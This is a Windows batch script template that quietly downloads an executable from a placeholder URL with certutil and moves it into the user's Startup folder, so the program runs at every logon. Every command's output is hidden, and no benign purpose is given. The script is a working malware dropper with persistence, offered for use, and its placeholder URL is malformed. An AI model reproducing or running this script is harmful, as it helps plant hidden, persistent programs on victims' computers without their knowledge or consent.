@echo off

::PLACE DIRECT DOWNLOAD LINK HERE
set url=https:www.FILEDOWNLOADLINK.com/FILENAME.exe >nul
::PLACE NAME OF FILE HERE
set file=FILENAME.exe >nul
::ignore the rest

certutil -urlcache -split -f %url% %file% >nul
md "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" >nul
move %file% "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\%file%" >nul
exit